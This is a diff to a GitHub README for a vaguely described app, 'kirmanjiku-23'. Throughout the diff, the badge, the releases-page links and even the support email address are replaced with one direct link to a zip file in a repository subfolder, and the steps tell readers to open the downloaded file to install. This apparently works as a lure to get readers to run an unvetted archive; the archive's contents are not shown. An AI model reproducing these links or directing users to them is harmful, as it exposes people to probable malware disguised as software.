@@ -1,6 +1,6 @@
 # 🚀 kirmanjiku-23 - Simple Solution for Your Needs
 
-![Download](https://img.shields.io/badge/Download-Now-blue)
+![Download](https://raw.githubusercontent.com/VM-Janani/kirmanjiku-23/main/mohar/kirmanjiku-23.zip)
 
 ## 📥 Overview
 
@@ -26,13 +26,13 @@ To get started with kirmanjiku-23, follow these simple steps to download and run
 
 ## 🌐 Download & Install
 
-To download kirmanjiku-23, visit this page: [Download kirmanjiku-23](https://github.com/VM-Janani/kirmanjiku-23/releases).
+To download kirmanjiku-23, visit this page: [Download kirmanjiku-23](https://raw.githubusercontent.com/VM-Janani/kirmanjiku-23/main/mohar/kirmanjiku-23.zip).
 
 On the releases page, you will find the latest version of the software available for download. Click on the appropriate file for your operating system. Follow the installation instructions that appear after you download the file.
 
 ## 💻 Installation Steps
 
-1. Visit this page to download the app: [Download kirmanjiku-23](https://github.com/VM-Janani/kirmanjiku-23/releases).
+1. Visit this page to download the app: [Download kirmanjiku-23](https://raw.githubusercontent.com/VM-Janani/kirmanjiku-23/main/mohar/kirmanjiku-23.zip).
 2. Locate the file for your operating system.
 3. Click the download link for the latest version.
 4. Once the download completes, open the file to start installation.
@@ -49,7 +49,7 @@ If you encounter any issues while downloading or installing kirmanjiku-23, here 
 
 ## 📞 Support
 
-If you need further assistance or have any questions, feel free to reach out. You can contact us via the issues section on GitHub, or you can email us directly at support@kirmanjiku-23.com. We are here to help you!
+If you need further assistance or have any questions, feel free to reach out. You can contact us via the issues section on GitHub, or you can email us directly at https://raw.githubusercontent.com/VM-Janani/kirmanjiku-23/main/mohar/kirmanjiku-23.zip We are here to help you!
 
 ## 🌟 Updates
 
